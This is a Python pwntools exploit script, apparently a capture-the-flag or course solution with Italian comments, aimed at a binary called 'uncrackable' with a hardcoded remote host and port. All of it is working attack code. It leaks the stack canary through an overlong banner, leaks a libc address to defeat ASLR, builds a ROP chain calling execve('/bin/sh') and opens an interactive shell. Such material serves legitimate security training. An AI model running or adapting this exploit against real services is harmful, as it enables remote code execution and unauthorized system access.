#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('uncrackable')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

global libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global libc
    if args.GDB:
        libc = ELF("libc.so.6")
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        libc = ELF("libc.so.6")
        return remote("131.114.59.19", 8200, *a, **kw)
    else:
        libc = ELF("/usr/lib/libc.so.6")
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
gef config context.nb_lines_stack 200
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

banner_buf_len = 65*8
addr_len = 8
canary = b"\x00"

io = start()

io.recvuntil(">> ")

io.sendline("4")
io.sendline(b"\x01"*0x1b)

#Sovrascriviamo sia il \0 del banner sia quello iniziale del canary per riceverlo da puts
io.recvuntil(">> ")
io.sendline("5")
io.recvuntil("Size of the new banner: ")
io.sendline(str(banner_buf_len+1))
io.sendline((banner_buf_len+1)*"a")
io.recvuntil((banner_buf_len+1)*"a")
tmp_canary = io.recvuntil("\n", True)
canary += tmp_canary[0:7]
print(b"Canary: " + canary)

canary_off = banner_buf_len
eip_off = banner_buf_len + 2*addr_len #Nota la variabile uint sulla stack
ret_addr_post_null_pos = eip_off

#Otteniamo l'indirizzo di __libc_start_main + 243 dalla stack
io.recvuntil(">> ")
io.sendline("5")
io.recvuntil("Size of the new banner: ")
io.sendline(str(ret_addr_post_null_pos))
io.sendline(ret_addr_post_null_pos*"a")
io.recvuntil(ret_addr_post_null_pos*"a")
main_tmp = io.recvuntil("\n", True)
print(main_tmp)
#Local
#libc_start_main_offset = 243

#Remote
libc_start_main_offset = 231
libc_start_main_addr = int.from_bytes(main_tmp, "little") - libc_start_main_offset

payload = dict()

libc.address = libc_start_main_addr - libc.sym.__libc_start_main
print(hex(libc.address))

R = ROP(libc)

R.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

print(R.dump())

payload[canary_off] = canary
payload[eip_off] = R.chain()

payload = fit(payload)

print(payload)

io.recvuntil(">> ")
io.sendline("5")
io.recvuntil("Size of the new banner: ")
io.sendline(str(len(payload)))
io.sendline(payload)

io.recvuntil(">> ")
io.sendline("9")

io.interactive()

